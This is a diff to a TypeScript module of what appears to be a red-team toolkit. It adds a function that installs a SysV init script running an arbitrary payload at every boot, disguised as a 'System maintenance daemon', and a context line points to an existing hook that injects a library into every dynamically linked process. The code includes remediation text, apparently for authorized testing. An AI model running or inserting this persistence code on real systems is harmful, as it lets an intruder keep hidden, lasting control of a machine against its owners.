@@ -371,3 +371,72 @@ echo "[*] WARNING: Every dynamically linked process will load this library"
 
   return { output: output.join("\n"), findings }
 }
+
+export async function sysvinitPersist(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== SysV Init Persistence ==="]
+  const payload = argVal(args, "--payload")
+  const name = argVal(args, "--name") || "cs-daemon"
+
+  const script = `
+echo "--- Init System Check ---"
+if [ -d /etc/init.d ]; then
+  echo "[+] /etc/init.d exists"
+  ls -la /etc/init.d/ 2>/dev/null | head -20
+  writable=$([ -w /etc/init.d/ ] && echo "WRITABLE" || echo "read-only")
+  echo "Directory is: $writable"
+else
+  echo "[-] /etc/init.d does not exist"
+fi
+echo ""
+echo "--- Run Level Links ---"
+ls /etc/rc*.d/ 2>/dev/null | head -20
+echo ""
+${payload ? `
+echo "--- Installing SysV Init Persistence ---"
+cat > /etc/init.d/${name} << 'INITSCRIPT'
+#!/bin/sh
+### BEGIN INIT INFO
+# Provides:          ${name}
+# Required-Start:    \$remote_fs \$syslog
+# Required-Stop:     \$remote_fs \$syslog
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description: System maintenance daemon
+### END INIT INFO
+case "\$1" in
+  start) ${payload} & ;;
+  stop) pkill -f "${payload}" 2>/dev/null ;;
+  *) echo "Usage: \$0 {start|stop}" ;;
+esac
+INITSCRIPT
+chmod +x /etc/init.d/${name} 2>/dev/null
+if command -v update-rc.d >/dev/null 2>&1; then
+  update-rc.d ${name} defaults 2>/dev/null && echo "[+] Init script installed and linked: ${name}" || echo "[-] update-rc.d failed"
+elif command -v chkconfig >/dev/null 2>&1; then
+  chkconfig --add ${name} 2>/dev/null && echo "[+] Init script installed and linked: ${name}" || echo "[-] chkconfig failed"
+else
+  echo "[+] Init script written but could not auto-link. Manually run: ln -s /etc/init.d/${name} /etc/rc2.d/S99${name}"
+fi
+` : `echo "[*] Dry run — pass --payload <cmd> --name <svc-name> to install."
+`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] Init script installed")) {
+    findings.push({
+      checkId: "LNX-INITP-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "INSTALLED",
+      resource: `/etc/init.d/${name}`,
+      title: "SysV init script persistence installed",
+      details: `Init script ${name} created in /etc/init.d/ with run level links — starts on boot`,
+      remediation: `Remove with: update-rc.d ${name} remove && rm /etc/init.d/${name}`,
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
